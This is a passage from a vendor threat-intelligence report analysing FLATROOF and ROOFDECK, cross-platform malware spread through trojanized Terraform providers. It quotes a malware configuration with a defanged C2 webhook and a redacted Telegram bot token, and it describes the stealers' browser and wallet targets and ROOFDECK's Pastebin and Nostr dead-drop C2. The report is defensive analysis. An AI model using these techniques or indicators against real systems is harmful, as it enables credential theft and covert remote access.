"hxxps://arusupport-region1-webhook[.]online/statics/cache/v11/abicfjej", "main_upload_url": "https://www.example.com", "payload_path_linux": ".config/snap/imagent", "payload_path_macos": "Library/Services/imagent", "payload_path_win": "AppData/Local/Microsoft/Windows/PowerShell/config.exe", "persist_enable": true, "persist_name_linux": "snap-imagent", "persist_name_macos": "imagent", "persist_name_win": "powershell-config-service", "persist_type_linux": "service", "persist_type_macos": "zlogout", "persist_type_win": "reg", "tg_room_id": -1003[redacted]807, "tg_token": "8757853278:[redacted]dKI91AvprMdUkqOLAq37AOKg" }The analyzed variants support three C2 mechanisms:Telegram Bot API for command retrieval and exfiltration of command results or files.GitHub API polling using a configured repository and token (not configured in the variant shown above).An attacker-controlled HTTP webhook for registration and tasking.Not every channel was configured in every sample, but the shared code supports multiple communication channels, providing redundancy and potentially allowing malicious traffic to blend in with traffic to widely used services.FLATROOF also implements platform-specific persistence mechanisms. The configuration references a service on Linux, a shell logout mechanism on macOS, and a registry Run value on Windows. Its command set supports system discovery, process and file management, command execution, payload download, data upload, persistence management, configuration changes, and self-removal.Embedded Python information stealersFLATROOF uses operating system-specific Python scripts to collect and package host and browser artifacts into a compressed archive for exfiltration. The Linux and macOS scripts stage data in temp/collected_data before creating temp/collected_data.zip, while the Windows script archives files from a directory named data into collected_data.zip and removes local staging files afterward.All three scripts target browser profile artifacts that can contain saved credentials, cookies, browsing history, and autofill data:Chromium-based browser databases: History, Cookies, Login Data, and Web DataFirefox browser databases: places.sqlite, cookies.sqlite, logins.json, key4.db, formhistory.sqlite, and addons.jsonCommand and shell historyList of installed applications and running processes, system information, and the current usernameThe scripts also include platform-specific capabilities for stealing sensitive data from each targeted operating system, as shown in the table below.PlatformAdditional CapabilitiesLinuxRetrieves the Chrome Safe Storage secret through the Linux Secret Service, copies local keyring files, and gathers OS and CPU information. macOSCollects Safari history, bookmarks, cookies, and extension names, as well as the user’s login.keychain-db file.WindowsCollects Chrome, Edge, and Brave browser data, Windows Credential Manager entries, PowerShell and Command Prompt history, and locally stored browser extension data for the cryptocurrency wallets MetaMask, Phantom, Trust Wallet, and Rabby. Table 2: Operating system-specific capabilities across Python scripts.Additionally, the Windows script contains two embedded native payloads. The first is a 64-bit Windows executable that is decoded using the XOR key 0x37 and injected into a suspended Chromium process to recover master encryption keys. The recovered keys are saved to [browser name]_aes.txt for staging. The second component, dropped as cookie_copy_tool.exe, copies cookie data when standard database copy operations fail.The Python script’s verbose comments, use of emojis, repetitive exception handling, and inconsistent naming conventions suggest that portions of the code may have been generated or modified with the assistance of a large language model (LLM), as shown in the figure below.Figure 3: Python script showing indications of code generated using AI.ROOFDECK backdoorThreatLabz also identified Windows and macOS variants of ROOFDECK that are likely related to this campaign. ROOFDECK's most distinctive feature is its resilient C2 discovery process. The malware first reads a local configuration file disguised as a legitimate application file. It can then retrieve a Pastebin file containing an encrypted server address and an RSA signature separated by ||.ROOFDECK verifies the signature before decrypting and accepting the server address. This prevents a third party from modifying the Pastebin file to redirect infected systems without the operator’s signing key. If the Pastebin lookup fails, ROOFDECK can query Nostr profile metadata. The malware contains a set of attacker-controlled public identities and relay servers, expands the relay list through a public directory, and reads the website field from profile events. At the time of analysis, an active profile named tulip pointed to the same Pastebin URL embedded in the Windows variant, as shown in the figure below.Figure 4: Attacker-controlled Nostr profile and metadata used to locate the current Pastebin URL for C2 discovery.This layered design provides several ways to obtain the C2 server address:Use the locally stored address.Retrieve a signed and encrypted address from Pastebin.Use Nostr metadata to locate the current dead-drop Pastebin URL.Once the server address is resolved, ROOFDECK communicates with the server over HTTP and WebSocket endpoints.The Windows and macOS variants implement nearly identical functionality, including:Host, process, disk, and filesystem discoveryExecution of individual shell commands and access to an interactive reverse shellFile creation, deletion, movement, compression, download, and uploadClipboard read and write operationsBackground task managementPersistence installation, removal, and status checksChanges to C2 and polling settingsAgent updates, version checks, and destruction Threat AttributionPublic reporting indicates that this campaign targets cryptocurrency and Web3 developers through trojanized developer tools that deliver cross-platform malware—tactics consistent with activity previously attributed to TraderTraitor.Similar campaigns have leveraged trojanized applications, Python packages, and social engineering via fraudulent job offers. The use of FLATROOF and ROOFDECK malware also overlaps with findings reported in the KelpDAO incident.ThreatLabz identified substantial overlap in tactics and targeting with TraderTraitor. However, ThreatLabz has not identified unique code similarities, shared infrastructure, or cryptographic links sufficient to independently attribute this campaign to TraderTraitor with high confidence. ConclusionThis campaign highlights how threat actors abuse trusted developer workflows through trojanized Terraform providers to deliver cross-platform malware across macOS, Linux, and Windows systems. FLATROOF and ROOFDECK provide extensive capabilities for credential theft and persistent access. ROOFDECK also supports resilient C2 discovery through signed Pastebin files and Nostr metadata. Organizations should restrict the use of untrusted Terraform providers, verify provider checksums, and monitor for unexpected process activity to reduce the risk of developer workstation compromise. Zscaler CoverageThe Zscaler Cloud Sandbox has been successful in detecting this campaign and its many variants. The figure below depicts the Zscaler Cloud Sandbox, showing detection details for the malware used in this campaign.Figure 5: Zscaler Cloud Sandbox report for the malware used in this campaign.In
